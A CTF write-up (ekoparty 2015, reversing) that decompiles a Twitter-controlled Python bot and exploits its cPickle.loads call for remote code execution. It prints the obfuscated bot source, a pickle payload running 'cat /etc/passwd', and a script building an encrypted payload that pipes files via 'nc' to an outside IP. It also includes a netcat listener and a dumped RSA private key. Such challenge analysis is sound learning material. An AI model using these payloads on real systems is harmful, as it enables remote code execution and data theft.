<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta http-equiv="x-ua-compatible" content="ie=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><style data-href="/styles.7dd3e9346247d5425248.css">.search-module--search-bar--6m8v4{max-width:300px}.search-module--search-bar--6m8v4>input{background:hsla(0,0%,100%,.72);padding:10px;border-radius:12px;border:0}.search-module--search-bar--6m8v4>ul{position:absolute;max-width:300px;max-height:640px;overflow:auto;background:#f6f6f6;margin:0}.search-module--search-bar--6m8v4>ul li{color:#000;width:100%;display:inline-block;margin:0;padding:12px 16px;line-height:24px;border:2px solid rgba(0,102,51,.2)}.search-module--search-bar--6m8v4>ul li:hover{background:#fff}html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}article,aside,details,figcaption,figure,footer,header,main,menu,nav,section,summary{display:block}audio,canvas,progress,video{display:inline-block}audio:not([controls]){display:none;height:0}progress{vertical-align:baseline}[hidden],template{display:none}a{background-color:transparent;-webkit-text-decoration-skip:objects}a:active,a:hover{outline-width:0}abbr[title]{border-bottom:none;text-decoration:underline;-webkit-text-decoration:underline dotted;text-decoration:underline dotted}b,strong{font-weight:inherit;font-weight:bolder}dfn{font-style:italic}h1{font-size:2em;margin:.67em 0}mark{background-color:#ff0;color:#000}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}img{border-style:none}svg:not(:root){overflow:hidden}code,kbd,pre,samp{font-family:monospace,monospace;font-size:1em}figure{margin:1em 40px}hr{box-sizing:content-box;height:0;overflow:visible}button,input,optgroup,select,textarea{font:inherit;margin:0}optgroup{font-weight:700}button,input{overflow:visible}button,select{text-transform:none}[type=reset],[type=submit],button,html [type=button]{-webkit-appearance:button}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]:-moz-focusring,[type=reset]:-moz-focusring,[type=submit]:-moz-focusring,button:-moz-focusring{outline:1px dotted ButtonText}fieldset{border:1px solid silver;margin:0 2px;padding:.35em .625em .75em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}textarea{overflow:auto}[type=checkbox],[type=radio]{box-sizing:border-box;padding:0}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-cancel-button,[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-input-placeholder{color:inherit;opacity:.54}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}html{font:112.5%/1.45em georgia,sans-serif;box-sizing:border-box;overflow-y:scroll}*,:after,:before{box-sizing:inherit}body{color:rgba(0,0,0,.8);font-family:georgia,sans-serif;font-weight:400;word-wrap:break-word;-webkit-font-kerning:normal;font-kerning:normal;-ms-font-feature-settings:"kern","liga","clig","calt";font-feature-settings:"kern","liga","clig","calt"}img{max-width:100%;margin:0;padding:0}h1{font-size:2.25rem}h1,h2{padding:0;margin:0 0 1.45rem;color:inherit;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Fira Sans,Droid Sans,Helvetica Neue,sans-serif;font-weight:700;text-rendering:optimizeLegibility;line-height:1.1}h2{font-size:1.62671rem}h3{font-size:1.38316rem}h3,h4{padding:0;margin:0 0 1.45rem;color:inherit;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Fira Sans,Droid Sans,Helvetica Neue,sans-serif;font-weight:700;text-rendering:optimizeLegibility;line-height:1.1}h4{font-size:1rem}h5{font-size:.85028rem}h5,h6{padding:0;margin:0 0 1.45rem;color:inherit;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Fira Sans,Droid Sans,Helvetica Neue,sans-serif;font-weight:700;text-rendering:optimizeLegibility;line-height:1.1}h6{font-size:.78405rem}hgroup{padding:0;margin:0 0 1.45rem}ol,ul{padding:0;margin:0 0 1.45rem 1.45rem;list-style-position:outside;list-style-image:none}dd,dl,figure,p{padding:0;margin:0 0 1.45rem}pre{margin:0 0 1.45rem;font-size:.85rem;line-height:1.42;background:rgba(0,0,0,.04);border-radius:3px;overflow:auto;word-wrap:normal;padding:1.45rem}table{font-size:1rem;line-height:1.45rem;border-collapse:collapse;width:100%}fieldset,table{padding:0;margin:0 0 1.45rem}blockquote{padding:0;margin:0 1.45rem 1.45rem}form,iframe,noscript{padding:0;margin:0 0 1.45rem}hr{padding:0;margin:0 0 calc(1.45rem - 1px);background:rgba(0,0,0,.2);border:none;height:1px}address{padding:0;margin:0 0 1.45rem}b,dt,strong,th{font-weight:700}li{margin-bottom:.725rem}ol li,ul li{padding-left:0}li>ol,li>ul{margin-left:1.45rem;margin-bottom:.725rem;margin-top:.725rem}blockquote :last-child,li :last-child,p :last-child{margin-bottom:0}li>p{margin-bottom:.725rem}code,kbd,samp{font-size:.85rem;line-height:1.45rem}abbr,abbr[title],acronym{border-bottom:1px dotted rgba(0,0,0,.5);cursor:help}abbr[title]{text-decoration:none}td,th,thead{text-align:left}td,th{border-bottom:1px solid rgba(0,0,0,.12);font-feature-settings:"tnum";-moz-font-feature-settings:"tnum";-ms-font-feature-settings:"tnum";-webkit-font-feature-settings:"tnum";padding:.725rem .96667rem calc(.725rem - 1px)}td:first-child,th:first-child{padding-left:0}td:last-child,th:last-child{padding-right:0}code,tt{background-color:rgba(0,0,0,.04);border-radius:3px;font-family:SFMono-Regular,Consolas,Roboto Mono,Droid Sans Mono,Liberation Mono,Menlo,Courier,monospace;padding:.2em 0}pre code{background:none;line-height:1.42}code:after,code:before,tt:after,tt:before{letter-spacing:-.2em;content:" "}pre code:after,pre code:before,pre tt:after,pre tt:before{content:""}@media only screen and (max-width:480px){html{font-size:100%}}footer{padding:96px 0;background:#0f0f0f;bottom:0;text-align:center;position:relative}footer,footer a{color:#999}footer a:focus,footer a:hover{color:#fff}footer .footer-module--social--QNE_v{margin:18px 0 30px;padding:0;font-size:30px}footer .footer-module--social--QNE_v li{display:inline-block;font-size:30px;padding:0;margin:0 0 0 42px;color:#f06000}footer .footer-module--social--QNE_v li:first-child{margin-left:0}@media only screen and (max-width:480px){footer .footer-module--social--QNE_v{font-size:20px}footer .footer-module--social--QNE_v li{margin-left:14px}}footer .footer-module--copyright--1-FxK{margin:0;padding:0}footer .footer-module--copyright--1-FxK li{display:inline-block;margin:0;padding:0;line-height:24px}.footer-module--ie--21UzZ footer .footer-module--copyright--1-FxK li{display:inline}footer .footer-module--copyright--1-FxK li:before{content:"\2022";padding-left:10px;padding-right:10px;color:#095153}footer .footer-module--copyright--1-FxK li:first-child:before{display:none}.footer-module--gotop--35bFg{position:absolute;top:-24px;left:50%;margin-left:-30px}.footer-module--gotop--35bFg a{text-decoration:none;border:0;display:block;width:48px;height:48px;background-color:#0f9095;-webkit-transition:all .2s ease-in-out;transition:all .2s ease-in-out;color:#fff;font-size:21px;line-height:50px;border-radius:100%;box-shadow:0 0 12px rgba(0,0,0,.2)}.footer-module--gotop--35bFg a:hover{background-color:#6f9}@media only screen and (max-width:767px){.footer-module--gotop--35bFg{margin-left:-22px}.footer-module--gotop--35bFg a{width:54px;height:54px;font-size:18px;line-height:54px}}.index-module--textBanner--YjZ-8{background:rgba(0,0,0,.6);border-radius:8px;border:1px solid rgba(0,96,0,.72)}.index-module--textBanner--YjZ-8 a{color:inherit}.team-module--social--1kmzU a{font-size:1.4rem;color:#6e6e6e}.writeups-module--card--2nKXd>p{margin:0;font-size:.75em;color:#efefef}.writeups-module--card--2nKXd>p:first-child{font-weight:700;color:#fff;font-size:1em}</style><meta name="generator" content="Gatsby 2.18.17"/><title data-react-helmet="true"></title><link rel="icon" href="/icons/icon-48x48.png?v=a0d10bd57137015161c2cfffb390d059"/><link rel="manifest" href="/manifest.webmanifest"/><meta name="theme-color" content="#663399"/><link rel="apple-touch-icon" sizes="48x48" href="/icons/icon-48x48.png?v=a0d10bd57137015161c2cfffb390d059"/><link rel="apple-touch-icon" sizes="72x72" href="/icons/icon-72x72.png?v=a0d10bd57137015161c2cfffb390d059"/><link rel="apple-touch-icon" sizes="96x96" href="/icons/icon-96x96.png?v=a0d10bd57137015161c2cfffb390d059"/><link rel="apple-touch-icon" sizes="144x144" href="/icons/icon-144x144.png?v=a0d10bd57137015161c2cfffb390d059"/><link rel="apple-touch-icon" sizes="192x192" href="/icons/icon-192x192.png?v=a0d10bd57137015161c2cfffb390d059"/><link rel="apple-touch-icon" sizes="256x256" href="/icons/icon-256x256.png?v=a0d10bd57137015161c2cfffb390d059"/><link rel="apple-touch-icon" sizes="384x384" href="/icons/icon-384x384.png?v=a0d10bd57137015161c2cfffb390d059"/><link rel="apple-touch-icon" sizes="512x512" href="/icons/icon-512x512.png?v=a0d10bd57137015161c2cfffb390d059"/><link rel="preconnect dns-prefetch" href="https://www.google-analytics.com"/><link as="script" rel="preload" href="/webpack-runtime-2d51d0099acd9d66f9d7.js"/><link as="script" rel="preload" href="/app-edafdb8a87528133144b.js"/><link as="script" rel="preload" href="/styles-33e987324329888a5c26.js"/><link as="script" rel="preload" href="/commons-4d3d2db350e8cd5683e5.js"/><link as="script" rel="preload" href="/component---src-templates-writeup-js-7c0407b776346122acce.js"/><link as="fetch" rel="preload" href="/page-data/writeups/ekoparty-ctf-2015/reversing/Malware/sudhackar/page-data.json" crossorigin="anonymous"/></head><body><div id="___gatsby"><div style="outline:none" tabindex="-1" role="group" id="gatsby-focus-wrapper">  <div class="headroom-wrapper"><div style="position:relative;top:0;left:0;right:0;z-index:100;-webkit-transform:translate3D(0, 0, 0);-ms-transform:translate3D(0, 0, 0);transform:translate3D(0, 0, 0);background:#000000;margin-bottom:1.45rem;height:107px;border-bottom:2px solid green" class="headroom headroom--unfixed"><div size="500" class="sc-htpNat fphlTp"><style data-emotion-css="zkfaav">.css-zkfaav{box-sizing:border-box;margin:0;min-width:0;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;}</style><div style="margin:0 auto;max-width:960px" class="css-zkfaav"><a href="/"><img height="96" alt="ByteBandits Logo" src="https://avatars3.githubusercontent.com/u/14941705?s=200&amp;v=4" style="display:inline"/></a><style data-emotion-css="1ntkiwo">.css-1ntkiwo{box-sizing:border-box;margin:0;min-width:0;margin-left:auto;margin-right:auto;}</style><div class="css-1ntkiwo"></div><style data-emotion-css="1xlvlwi">.css-1xlvlwi{box-sizing:border-box;margin:0;min-width:0;margin-left:32px;color:backgroundLight;background-color:background;font-size:16px;}@media screen and (min-width:40em){.css-1xlvlwi{margin-left:16px;font-size:20px;}}</style><div class="css-1xlvlwi"><a style="color:white;max-width:960px;cursor:pointer" class="sc-bdVaJa itCArd" href="/">Home</a></div><div class="css-1xlvlwi"><a style="color:white;max-width:960px;cursor:pointer" class="sc-bdVaJa itCArd" href="/team">Team</a></div><div class="css-1xlvlwi"><a style="color:white;max-width:960px;cursor:pointer" class="sc-bdVaJa itCArd" href="/writeups">Writeups</a></div><div class="css-1xlvlwi"><div size="640" class="sc-htpNat hHOyFO"><div class="search-module--search-bar--6m8v4"><input type="text" value="" placeholder="Search writeups.."/><ul></ul></div></div></div></div></div><div size="500" class="sc-bwzfXH fdqunv"><style data-emotion-css="1ej4okp">.css-1ej4okp{box-sizing:border-box;margin:0;min-width:0;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;}</style><div class="css-1ej4okp"><style data-emotion-css="1j93ezg">.css-1j93ezg{box-sizing:border-box;margin:0;min-width:0;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;width:100%;padding-left:16px;padding-right:16px;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;}</style><div class="css-1j93ezg"><a href="/"><img height="96" alt="ByteBandits Logo" src="https://avatars3.githubusercontent.com/u/14941705?s=200&amp;v=4" style="display:inline"/></a><style data-emotion-css="1ntkiwo">.css-1ntkiwo{box-sizing:border-box;margin:0;min-width:0;margin-left:auto;margin-right:auto;}</style><div class="css-1ntkiwo"></div><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" size="30" color="white" style="color:white" height="30" width="30" xmlns="http://www.w3.org/2000/svg"><path d="M2 15.5v2h20v-2H2zm0-5v2h20v-2H2zm0-5v2h20v-2H2z"></path></svg></div></div></div></div></div><div style="margin:0 auto;max-width:960px;padding-top:24px"><main><div style="color:grey;margin-top:24px;text-align:right"><a href="https://github.com/ByteBandits/writeups/tree/master/ekoparty-ctf-2015/reversing/Malware/sudhackar">View this writeup on GitHub</a></div><div style="margin-bottom:64px"><p><a href="ctf=ekoparty-ctf-2015"></a>
<a href="type=reversing"></a>
<a href="tags=malware,control,pickle,RSA"></a>
<a href="tools=Twitter,easy-python-decompiler"></a>
<a href="techniques=Decompiling"></a></p>
<h1>Malware (rev-200)</h1>
<p>We have a <a href="/5d0cf6207fa5d23f2e8ab7215ea634d1/rev200.zip">zip</a>.
Extract and we get</p>
<pre><code class="language-bash">$ file ekobot_final.pyc 
ekobot_final.pyc: python 2.7 byte-compiled
</code></pre>
<p>Byte-compiled python can be very easily decompiled. So here I use <a href="http://sourceforge.net/projects/easypythondecompiler/">Easy Python Decompiler</a>. We get an <a href="/b793de9c6a68dc9e788023f39fd77f1d/ekobot_final.py">output</a> which is scary!</p>
<pre><code class="language-python"># Embedded file name: ekobot_final.py
import os
import sys
import httplib2
import cPickle
from Crypto.PublicKey import RSA
from base64 import b64decode
from twython import Twython
if 0:
    i11iIiiIii
OO0o = 'ekoctf'
if 0:
    Iii1I1 + OO0O0O % iiiii % ii1I - ooO0OO000o
if len(sys.argv) != 2:
    os._exit(0)
    if 0:
        IiII1IiiIiI1 / iIiiiI1IiI1I1
o0OoOoOO00 = sys.argv[1]
if 0:
    OOOo0 / Oo - Ooo00oOo00o.I1IiI
o0OOO = 'ienmDwTNHZVR9si4SzeCg1glB'
iIiiiI = 'TTlOJrwq5o9obnRyQXRyaOkRoYUBTrCzN9j9IHX0Bc4dS2xBHN'
if 0:
    iii1II11ii * i11iII1iiI + iI1Ii11111iIi + ii1II11I1ii1I + oO0o0ooO0 - iiIIIII1i1iI

def o0oO0():
    oo00 = 0
    if os.path.isfile(o0OoOoOO00):
        try:
            o00 = open(o0OoOoOO00, 'r')
            oo00 = int(o00.readline(), 10)
        except:
            oo00 = 0

    return oo00
    if 0:
        II1ii - o0oOoO00o.ooO0OO000o + ii1II11I1ii1I.ooO0OO000o - iI1Ii11111iIi


def oo(twid):
    try:
        o00 = open(o0OoOoOO00, 'w')
        o00.write(str(twid))
    except:
        if 0:
            oO0o0ooO0 - OO0O0O - IiII1IiiIiI1.ii1II11I1ii1I * iiIIIII1i1iI * ii1I
        if 0:
            ii1II11I1ii1I


def oo00000o0(url):
    I11i1i11i1I = httplib2.Http('')
    Iiii, OOO0O = I11i1i11i1I.request(url, 'GET')
    if Iiii.status == 200:
        try:
            if Iiii['content-type'][0:10] == 'text/plain':
                return OOO0O
            return 'Err'
        except:
            return 'Err'

    else:
        return url
        if 0:
            o0oOoO00o


def IiI1i(cipher_text):
    try:
        OOo0o0 = RSA.importKey(open('ekobot.pem').read())
        O0OoOoo00o = b64decode(cipher_text)
        iiiI11 = OOo0o0.decrypt(O0OoOoo00o)
        return iiiI11
    except Exception as OOooO:
        print str(OOooO)
        return 'Err'
        if 0:
            OOOo0 + Oo / ii1II11I1ii1I * iiiii


II111iiii = Twython(o0OOO, iIiiiI, oauth_version=2)
II = II111iiii.obtain_access_token()
II111iiii = Twython(o0OOO, access_token=II)
if 0:
    Oo % ii1I
oo00 = o0oO0()
o0oOo0Ooo0O = II111iiii.search(q='#' + OO0o, rpp='250', result_type='mixed', since_id=oo00)
if 0:
    I1IiI * iiIIIII1i1iI * iI1Ii11111iIi - oO0o0ooO0 - Ooo00oOo00o
for OooO0OO in o0oOo0Ooo0O['statuses']:
    if OooO0OO['id'] > oo00:
        oo00 = OooO0OO['id']
        if 0:
            ooO0OO000o
    iii11iII = 0
    try:
        for i1I111I in OooO0OO['entities']['hashtags']:
            if i1I111I['text'] == OO0o:
                iii11iII = 1

        if iii11iII == 1:
            for i11I1IIiiIi in OooO0OO['entities']['urls']:
                if os.fork() == 0:
                    IiIiIi = IiI1i(oo00000o0(i11I1IIiiIi['url']))
                    if IiIiIi[0:5] == 'eko11':
                        cPickle.loads(IiIiIi[5:])
                    os._exit(0)
                    if 0:
                        iii1II11ii.Oo.iIiiiI1IiI1I1.ii1I

    except Exception as OOooO:
        print str(OOooO)
        if 0:
            ii1II11I1ii1I + ooO0OO000o % i11iIiiIii.o0oOoO00o - IiII1IiiIiI1

oo(oo00)
</code></pre>
<p>I scroll though the code and rename variables to make it more readable and easy to debug. <a href="/36cb44c57283c59fd6eed35be3ecf000/ekobot-chall.py">Final</a></p>
<pre><code class="language-python">import os
import sys
import httplib2
import cPickle
from Crypto.PublicKey import RSA
from base64 import b64decode
from twython import Twython
name = 'ekoctf'

if len(sys.argv) != 2:
    os._exit(0)
    if 0:
        IiII1IiiIiI1 / iIiiiI1IiI1I1
argv_1 = sys.argv[1]
Secret = 'ienmDwTNHZVR9si4SzeCg1glB'
key = 'TTlOJrwq5o9obnRyQXRyaOkRoYUBTrCzN9j9IHX0Bc4dS2xBHN'
print "Here!"
def o0oO0():
    max_id = 0
    if os.path.isfile(argv_1):
        try:
            o00 = open(argv_1, 'r')
            max_id = int(o00.readline(), 10)
        except:
            max_id = 0

    return max_id

def save_new_max(twid):
    try:
        o00 = open(argv_1, 'w')
        o00.write(str(twid))
    except:
        print error


def get_content(url):
    print url
    I11i1i11i1I = httplib2.Http('')
    Iiii, OOO0O = I11i1i11i1I.request(url, 'GET')
    if Iiii.status == 200:
        try:
            if Iiii['content-type'][0:10] == 'text/plain':
                return OOO0O
            return 'Err'
        except:
            return 'Err'

    else:
        return url

def decrypt(cipher_text):
    print cipher_text
    return 'err'
    try:
        OOo0o0 = RSA.importKey(open('ekobot.pem').read())
        O0OoOoo00o = b64decode(cipher_text)
        iiiI11 = OOo0o0.decrypt(O0OoOoo00o)
        return iiiI11
    except Exception as OOooO:
        print str(OOooO)
        return 'Err'
twython_object = Twython(Secret, key, oauth_version=2)
access_token = twython_object.obtain_access_token()
twython_object = Twython(Secret, access_token=access_token)
max_id = o0oO0()
search_result = twython_object.search(q='#' + name, rpp='250', result_type='mixed', since_id=max_id)

for i in search_result['statuses']:
    print i['id']
    if i['id'] > max_id:
        max_id = i['id']
    iii11iII = 0
    try:
        for i1I111I in i['entities']['hashtags']:
            if i1I111I['text'] == name:
                iii11iII = 1

        if iii11iII == 1:
            for j in i['entities']['urls']:
                if True:
                    IiIiIi = decrypt(get_content(j['url']))
                    print IiIiIi
                    if IiIiIi[0:5] == 'eko11':
                        cPickle.loads(IiIiIi[5:])
                    #os._exit(0)

    except Exception as OOooO:
        print str(OOooO)

print max_id
</code></pre>
<p>Now twython is Python wrapper for the Twitter API. Here first the program is registering itself and then searching for tweets with 'ekoctf' tag. For every tweet it will try to extract a url from it, then visit the url and dowload the content if its 'text\plain' Content-type. Next this content is decrypted by some private key locally stored. The decrypted plaintext is verified for starting with 'eko11' and the rest is loaded os cPickle.</p>
<p>cPickle is used to serialize python objects and suffers from code execution on loads().</p>
<pre><code class="language-python">cPickle.loads('cos\nsystem\n(S'cat /etc/passwd'\ntR.'\ntR.')
</code></pre>
<p>If this service is being run somewhere then we can have code execution on that machine just by Tweeting our commands.
A nice example of C&#x26;C( command and control ).</p>
<p>However we would need a public key for encrypting the data. Looking around on twitter we find the <a href="/4d09c7c3dfa9d92f853e91510a7ce81a/pub.pem">key</a> with same hashtag.
Now we can get the flag by various methods on the machine. We can make a request to a controlled domain with contents of the flag.</p>
<p>What I did was "cat * | nc my-machine port". It will dump the contents of every file to the port which I was listening on my machine.
A quick RSA encryption</p>
<pre><code class="language-python">from Crypto.PublicKey import RSA
from base64 import b64decode,b64encode

key=RSA.importKey(open('pub.pem').read())
exploit="eko11"+"cos\nsystem\n(S'cat * | nc 182.70.222.238 8000'\ntR.'\ntR."
txt=key.encrypt(exploit,32)[0]
final=b64encode(txt)
print final
</code></pre>
<p>We can use pastebin's view-raw url as a link in the tweet and </p>
<pre><code class="language-bash">while true ; do nc -l -n -v  -p 8000 ; done
</code></pre>
<p>on my machine. After some 30-40 seconds</p>
<pre><code>-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAmWw84H8BSPG1Ispn1hBPWZ4ORxniLhOl76aOAsGsqdRZJyL+
PFLWedGUx0ELwzf3vWQ2wMDwN37MZYWdS4z8WT6P4FRtK09UtDgqNUQdx49WBqDf
2GmIT+uBwMQBUCe3x+RTVcwDzA1I0mPtJj3K6bGdmSSBZjgc6MA4rJil7xdSVP5P
edb8MZMKk/5tXmFl3gFjykkUfG+DbmsxulZ48D+IoIU6bVWAkael+ftZtDWY43Xk
ezD2swV01Eaw4J7MzBakPDA6KipxNhKQZ2xoeEsP2p8L67qF48eUbxI1ukcrqdy0
c92rSihmChGBmHQ2AREshtTTLpM24/Nrirje/QIDAQABAoIBAEF/xyGktxy4LDe1
J81o2yeMZdYPA9PeCYqdlaUxoBBFGuatdtK0HuKVCipi562pWDff78ws0qEunf59
o6CciSNkpTIFeTHzRVtHWyWwdfI7jGN6DPasX0iXZ6avR0w8GKbbIITRe5GC3mML
zDP2T4mjjX/S6PeF3zmyzr9I0BaZOgTdUumuYCzDfA9+MgRxIUi9i+7rrOMTiGdo
WGJVGC+j8vQiyf5eOGtlQxYLwm2pWas3EYrvk6jiesNhdDvr87X7YW8uABwUlLr5
5m/vocLCJLpo+QjFdyo6bNd/wEfQs1pG9C0UPIe46YIEeAkY08q2a5xzikfx/CGL
nsgc/dUCgYEAyynNy9qbUEbgJr6dfksTs2nBu89yG/vy3eoNoUbStr0LCAIYl8kn
XnwliCuli/5Zssb6/uBqX7fUuD3ztgCmo8KoNjJ/VHh9n701Uwl5FghqeoILnQHI
CFbN1Ub18VoOLt2SjgKN+7sqqrEiCqyyFxyoCDyBkBOqS7gr0V+/wMMCgYEAwVLQ
VZb335ovMx20cE8yO200dbwFdlJsYhM0PKSLLJ0aSsymrhFhUZC/rjQ8rJD1zs+W
lg6QeQ6yQRE4n4egi8NOnMms83kIMGeOa5VvCcQxXJ8v4Vez432SOeRHMxiUmiME
XHGnulsI9NhKYoMKfvfvLEwptzhCfAr2QO7e5T8CgYEAuFcZFVQowuFcd6tTagmj
OZLHJ6tl5YBpcPPzJBgID6lePgjw2aC6aSAKShEYZ/sE1pN3oRZtTqaVjAsifE0A
5uw0BuEw6ateiTd8D/kzdktymfAvq2m3X+GraE630COfZOTFGre0rum4ICMTOU5T
VWc6DCcihGFjjsrwb00Kx1MCgYAB9KuE4iUZzv6BPuCvbi2s6jroogFQJB9Skq0p
m+SIjAJTFWTuR+C7KYK26XJfsIu8Dt+QHw+ZGev1uo3fF0kpgM1Pyr6ELApIKxQG
xJk9+Q0iyb17Qx7fw0pyaXvK6Ym/UXFe2gt/WCJsD7AY9QhrJmj2AsM9RkVt6dJ5
77CzkwKBgQCk8oTtzfyXzUWcqsiekmHmzDAuO+SH/a0/FP2ceTq0I1caS6OAvYlj
R9aTJk5P02EmnfWCZVpMhzHlL4zO1x+2PiUiAXOthbyufWt5qyigp6jsNouLqFz0
Oksk+bPu1XDVqT2XpoQtFXyFuJZmaFlA3k2Ny7rGe5bJ8XWCX6E+Bg==
-----END RSA PRIVATE KEY-----
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmWw84H8BSPG1Ispn1hBP
WZ4ORxniLhOl76aOAsGsqdRZJyL+PFLWedGUx0ELwzf3vWQ2wMDwN37MZYWdS4z8
WT6P4FRtK09UtDgqNUQdx49WBqDf2GmIT+uBwMQBUCe3x+RTVcwDzA1I0mPtJj3K
6bGdmSSBZjgc6MA4rJil7xdSVP5Pedb8MZMKk/5tXmFl3gFjykkUfG+DbmsxulZ4
8D+IoIU6bVWAkael+ftZtDWY43XkezD2swV01Eaw4J7MzBakPDA6KipxNhKQZ2xo
eEsP2p8L67qF48eUbxI1ukcrqdy0c92rSihmChGBmHQ2AREshtTTLpM24/Nrirje
/QIDAQAB
-----END PUBLIC KEY-----
#/usr/bin/python
import os
import sys
import httplib2
import cPickle
from Crypto . PublicKey import RSA
from base64 import b64decode
from twython import Twython
if 64 - 64: i11iIiiIii
OO0o = 'ekoctf'
if 81 - 81: Iii1I1 + OO0O0O % iiiii % ii1I - ooO0OO000o
if ( len ( sys . argv ) &#x3C;> 2 ) :
 os . _exit ( 0 )
 if 4 - 4: IiII1IiiIiI1 / iIiiiI1IiI1I1
o0OoOoOO00 = sys . argv [ 1 ]
if 27 - 27: OOOo0 / Oo - Ooo00oOo00o . I1IiI
o0OOO = 'ienmDwTNHZVR9si4SzeCg1glB'
iIiiiI = 'TTlOJrwq5o9obnRyQXRyaOkRoYUBTrCzN9j9IHX0Bc4dS2xBHN'
if 23 - 23: iii1II11ii * i11iII1iiI + iI1Ii11111iIi + ii1II11I1ii1I + oO0o0ooO0 - iiIIIII1i1iI
def o0oO0 ( ) :
 oo00 = 0
 if os . path . isfile ( o0OoOoOO00 ) :
  try :
   o00 = open ( o0OoOoOO00 , "r" )
   oo00 = int ( o00 . readline ( ) , 10 )
  except :
   oo00 = 0
 return oo00
 if 62 - 62: II1ii - o0oOoO00o . ooO0OO000o + ii1II11I1ii1I . ooO0OO000o - iI1Ii11111iIi
def oo ( twid ) :
 try :
  o00 = open ( o0OoOoOO00 , "w" )
  o00 . write ( str ( twid ) )
 except :
  pass
  if 89 - 89: oO0o0ooO0 - OO0O0O - IiII1IiiIiI1 . ii1II11I1ii1I * iiIIIII1i1iI * ii1I
  if 25 - 25: ii1II11I1ii1I
def oo00000o0 ( url ) :
 I11i1i11i1I = httplib2 . Http ( "" )
 Iiii , OOO0O = I11i1i11i1I . request ( url , 'GET' )
 if Iiii . status == 200 :
  try :
   if Iiii [ "content-type" ] [ 0 : 10 ] == 'text/plain' :
    return OOO0O
   else :
    return 'Err'
  except :
   return 'Err'
 else :
  return url
  if 94 - 94: o0oOoO00o
def IiI1i ( cipher_text ) :
 try :
  OOo0o0 = RSA . importKey ( open ( 'ekobot.pem' ) . read ( ) )
  O0OoOoo00o = b64decode ( cipher_text )
  iiiI11 = OOo0o0 . decrypt ( O0OoOoo00o )
  return iiiI11
 except Exception , OOooO :
  print str ( OOooO )
  return 'Err'
  if 58 - 58: OOOo0 + Oo / ii1II11I1ii1I * iiiii
II111iiii = Twython ( o0OOO , iIiiiI , oauth_version = 2 )
II = II111iiii . obtain_access_token ( )
II111iiii = Twython ( o0OOO , access_token = II )
if 63 - 63: Oo % ii1I
oo00 = o0oO0 ( )
o0oOo0Ooo0O = II111iiii . search ( q = '#' + OO0o , rpp = "250" , result_type = "mixed" , since_id = oo00 )
if 81 - 81: I1IiI * iiIIIII1i1iI * iI1Ii11111iIi - oO0o0ooO0 - Ooo00oOo00o
for OooO0OO in o0oOo0Ooo0O [ 'statuses' ] :
 if OooO0OO [ 'id' ] > oo00 :
  oo00 = OooO0OO [ 'id' ]
  if 28 - 28: ooO0OO000o
 iii11iII = 0
 try :
  for i1I111I in OooO0OO [ 'entities' ] [ 'hashtags' ] :
   if i1I111I [ 'text' ] == OO0o :
    iii11iII = 1
  if iii11iII == 1 :
   for i11I1IIiiIi in OooO0OO [ 'entities' ] [ 'urls' ] :
    if os . fork ( ) == 0 :
     IiIiIi = IiI1i ( oo00000o0 ( i11I1IIiiIi [ 'url' ] ) )
     if IiIiIi [ 0 : 5 ] == 'eko11' :
      cPickle . loads ( IiIiIi [ 5 : ] )
     os . _exit ( 0 )
     if 40 - 40: iii1II11ii . Oo . iIiiiI1IiI1I1 . ii1I
 except Exception , OOooO :
  print str ( OOooO )
  if 33 - 33: ii1II11I1ii1I + ooO0OO000o % i11iIiiIii . o0oOoO00o - IiII1IiiIiI1
oo ( oo00 )
# dd678faae9ac167bc83abf78e5cb2f3f0688d3a3
EKO{simple_C&#x26;C_RSAtu1ts}
</code></pre>
<p>Flag:</p>
<blockquote>
<p>EKO{simple_C&#x26;C_RSAtu1ts}</p>
</blockquote>
<p>PS: I spent about 10 hours on this chall only because of the API. It never read my tweets. The admin fmunozs was cool and helpful and even used his account to tweet. Cheers man!</p></div></main></div><footer><ul class="footer-module--social--QNE_v"><li><a href="https://twitter.com/BanditsByte"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 